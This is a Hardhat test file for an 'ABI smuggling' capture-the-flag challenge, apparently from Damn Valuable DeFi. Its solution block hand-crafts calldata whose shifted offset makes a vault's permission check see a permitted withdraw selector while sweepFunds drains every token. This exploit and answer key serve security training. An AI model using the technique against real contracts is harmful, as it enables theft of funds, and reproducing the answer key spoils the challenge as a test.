const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // execute function sig (4 bytes) | target (32 bytes) | size of actionData (32 bytes) | empty padding (32 bytes) | function sig withdraw (4 bytes) | length of actionData (32 bytes) | actionData (4+32+32 bytes)
        const executeFn = await vault.interface.getFunction("execute");
        const executeSig = await vault.interface.getSighash(executeFn); 
        const vaultAddress = ethers.utils.hexZeroPad(vault.address, 32);
        const actionDataOffset = ethers.utils.hexZeroPad("0x64", 32);
        const fakePadding = ethers.utils.hexZeroPad("0x0", 32);
        const withdrawFn = await vault.interface.getFunction("withdraw");
        const withdrawSig = await vault.interface.getSighash(withdrawFn); 
        const actionDataLength = ethers.utils.hexZeroPad("0x44", 32);
        const actionDataContent = vault.interface.encodeFunctionData("sweepFunds", [ recovery.address, token.address ])

        const txData = ethers.utils.hexConcat([executeSig, vaultAddress, actionDataOffset, fakePadding, withdrawSig, actionDataLength, actionDataContent]);
        await player.sendTransaction({ to: vault.address, data: txData })
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
